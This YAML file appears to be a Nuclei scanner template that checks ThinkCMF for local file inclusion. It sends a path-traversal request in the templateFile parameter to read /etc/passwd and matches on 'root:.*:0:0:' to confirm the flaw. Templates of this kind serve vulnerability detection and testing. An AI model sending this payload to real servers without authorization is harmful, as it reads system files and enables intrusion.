id: thinkcmf-lfi1

info:
  name: ThinkCMF LFI
  author: pikpikcu
  severity: high
  reference: https://www.freebuf.com/vuls/217586.html
  tags: thinkcmf,lfi


requests:
  - raw:
      - |
        GET /?a=display&templateFile=../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept-Encoding: gzip, deflate
        Accept: */*
    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:.*:0:0:"
          - "bit app support"

      - type: status
        status:
          - 200
